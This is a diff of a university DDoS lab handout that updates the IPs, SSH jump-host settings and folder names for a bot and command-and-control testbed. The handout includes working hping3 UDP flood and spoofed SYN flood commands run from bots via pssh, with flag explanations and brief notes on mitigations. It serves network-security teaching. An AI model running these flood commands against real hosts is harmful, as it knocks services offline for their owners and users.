@@ -38,19 +38,21 @@ In this lab, you will:
     In this lab, 4 kind of machines will be involved:\
 
 
-    Bot: machine to launch attacks.
+    Bot: machine to launch attacks. Only accessable from CnC machine by "ssh \<Bot-IP>"\
+
 
     IP: Bot1: 192.168.10.109 Hosted on machine:192.168.10.21
 
+    \
     Bot2: 192.168.10.132 Hosted on machine:192.168.10.20
 
-    Credentials: ^^^^/^^^^^^ Same as spoof
 
 
 
-    CnC: command and control machine used to observe and connect to Bots.
 
-    IP: 192.168.10.125
+    CnC: command and control machine used to observe and connect to Bots. (the spoof machine)
+
+    IP: 192.168.10.111
 
     Credentials: \*\*\*\*\***/**\* \*\*\*\*\* Same as spoof
 
@@ -69,13 +71,13 @@ In this lab, you will:
 
 
 
-1.  Add SSH configuration: (add “ForwardX11 yes” to host spoof)
+1.  (Optional for Remote Access)Add SSH configuration: (add “ForwardX11 yes” to host spoof)
 
-    | <p>Host eceddos<br>  HostName 130.127.248.232<br>  User ddos</p><p><br>Host sniffer<br>  HostName 192.168.10.9<br>  User &#x3C;your username here><br>  ForwardX11 yes<br>  ProxyCommand ssh -W %h:%p eceddos</p><p><br>Host cnc<br>  User root<br>  HostName 192.168.10.125<br>  ProxyCommand ssh -W %h:%p eceddos</p><p><br>Host bot1_host<br>  User &#x3C;your username here><br>  HostName 192.168.10.21<br>  ProxyCommand ssh -W %h:%p eceddos</p><p><br>Host bot2_host<br>  User &#x3C;your username here><br>  HostName 192.168.10.20<br>  ProxyCommand ssh -W %h:%p eceddos</p><p><br>Host victim_host</p><p>  User &#x3C;your username here><br>  HostName 192.168.10.22<br>  ProxyCommand ssh -W %h:%p eceddos</p> |
-    | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+    | <p>Host eceddos<br>  HostName 130.127.248.232<br>  User ddos</p><p><br>Host sniffer<br>  HostName 192.168.10.10<br>  User &#x3C;your username here><br>  ForwardX11 yes<br>  ProxyCommand ssh -W %h:%p eceddos</p><p><br>Host cnc<br>  User root<br>  HostName 192.168.10.111<br>  ProxyCommand ssh -W %h:%p eceddos</p><p><br>Host bot1_host<br>  User &#x3C;your username here><br>  HostName 192.168.10.21<br>  ProxyCommand ssh -W %h:%p eceddos</p><p><br>Host bot2_host<br>  User &#x3C;your username here><br>  HostName 192.168.10.20<br>  ProxyCommand ssh -W %h:%p eceddos</p><p><br>Host victim_host</p><p>  User &#x3C;your username here><br>  HostName 192.168.10.22<br>  ProxyCommand ssh -W %h:%p eceddos</p> |
+    | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
 2.  Victim response time observing:
 
-    In CnC machine, goto DDoS\_Lab4 folder and run:
+    In CnC machine, goto Lab2 folder and run:
 
     | #./ping\_web.sh 192.168.10.112 |
     | ------------------------------ |
@@ -85,7 +87,7 @@ In this lab, you will:
 
 3.  FLOOD ATTACK
 
-    In the CnC machine, go to DDoS\_Lab4 folder and execute the following commands:
+    In the CnC machine, go to Lab2 folder and execute the following commands:
 
     | #pssh -h bots.txt -P -t100 'hostname' |
     | ------------------------------------- |
@@ -100,8 +102,8 @@ In this lab, you will:
     * sleep: Delay for a specified amount of time
     * hping3: Send (almost) arbitrary TCP/IP packets to network hosts
     * \--udp: UDP mode
-    * \-d data size: set packet body size
-    * \-p: set destination port
+    * -d data size: set packet body size
+    * -p: set destination port
     * \--flood: send packets as fast as possible without taking care to show incoming replies.
     * &: executes the commands in the background.
     * pkill: look up or signal processes based on name and other attributes.
@@ -121,13 +123,13 @@ In this lab, you will:
     | #hping3 -V -c 10 -d 120 -S -w 64 -p 80 -i u10000 --rand-source 192.168.10.112 |
     | ----------------------------------------------------------------------------- |
 
-    * \-V :enable verbose output
-    * \-c count: stop after sending(and receiving) count response packets
-    * \-d data size: set packet body size
-    * \-S: set SYN tcp flag
-    * \-w: set TCP window size. Default is 64.
-    * \-p: set destination port
-    * \-i: wait the specified number of seconds or microseconds between sending each packet.
+    * -V :enable verbose output
+    * -c count: stop after sending(and receiving) count response packets
+    * -d data size: set packet body size
+    * -S: set SYN tcp flag
+    * -w: set TCP window size. Default is 64.
+    * -p: set destination port
+    * -i: wait the specified number of seconds or microseconds between sending each packet.
     * \--rand-source: this option enables the random source mode. Hping will send packets with random source addresses.
 
     If the above command doesn’t get the expected result, change count to a bigger one.
@@ -161,6 +163,6 @@ Flood attack consumes network bandwidth by sending a large number of packets and
 
 SYN flood attack takes advantage of the three-way handshake of the TCP connection by sending a large amount of SYN packets but never actually establishing any connections. SYN cookie is one of the most commonly used methods to mitigate such attacks. However, it is still debating whether it is good to use SYN cookie on heavy loaded servers.
 
-* Defenses Against TCP SYN Flooding Attacks : [https://www.cisco.com/c/dam/en\_us/about/ac123/ac147/archived\_issues/ipj\_9-4/ipj\_9-4.pdf](https://www.cisco.com/c/dam/en\_us/about/ac123/ac147/archived\_issues/ipj\_9-4/ipj\_9-4.pdf)
+* Defenses Against TCP SYN Flooding Attacks : [https://www.cisco.com/c/dam/en\_us/about/ac123/ac147/archived\_issues/ipj\_9-4/ipj\_9-4.pdf](https://www.cisco.com/c/dam/en_us/about/ac123/ac147/archived_issues/ipj_9-4/ipj_9-4.pdf)
 
 \
